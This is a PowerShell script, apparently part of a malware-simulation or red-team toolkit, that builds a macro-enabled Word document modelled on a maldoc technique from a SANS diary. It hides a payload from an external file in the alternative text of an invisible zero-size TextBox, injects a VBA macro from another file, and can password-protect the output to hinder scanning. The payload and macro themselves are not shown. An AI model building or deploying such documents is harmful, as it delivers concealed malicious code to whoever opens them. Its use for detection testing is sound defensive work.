Import-Module $PSScriptRoot\..\..\internals\utils.psm1
Import-Module $PSScriptRoot\..\..\internals\tools.psm1

<#

https://isc.sans.edu/forums/diary/Word+maldoc+yet+another+place+to+hide+a+command/24370/

https://www.virustotal.com/gui/file/025f16ec6eb892f6f9b60c1fcc4104b3c22387b355e7a05932483251e8244cf5/detection

#>
function Build() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $out,

        [Parameter(mandatory=$false)]
        [String]
        $pass
    )

    $payload = [System.IO.File]::ReadAllText("$PSScriptRoot\payloads.txt")

    $wdApp = New-Object -COMObject "Word.Application"
    $wdApp.Visible = $false
    $fname = "$PSScriptRoot\Doc1.docm"
    $wdDoc = $wdApp.documents.open($fname)

    $shape = $wdDoc.Shapes.AddOLEControl("Forms.TextBox.1")
    $shape.AlternativeText = $payload
    $shape.height = 0
    $shape.width = 0

    $vbaModule = $wdDoc.VBProject.VBComponents.Add(1)
    $macro = BuildMacro
    $vbaModule.CodeModule.AddFromString($macro) | Out-Null

    # 13 is needed for docm
    # https://docs.microsoft.com/en-us/office/vba/api/Word.WdSaveFormat
    if (!$pass) {
        $wdDoc.SaveAs($out, 13)
        $wdDoc.Close()
        $wdApp.Quit()
    } else {
        $wdDoc.SaveAs($out, 13, 0, $pass)
        $wdDoc.Close()
        $wdApp.Quit()
    } 

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdDoc) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Remove-Variable wdDoc
    Remove-Variable wdApp

}

function BuildMacro() {

    $macro = [System.IO.File]::ReadAllText("$PSScriptRoot\macro.txt")

    return $macro

}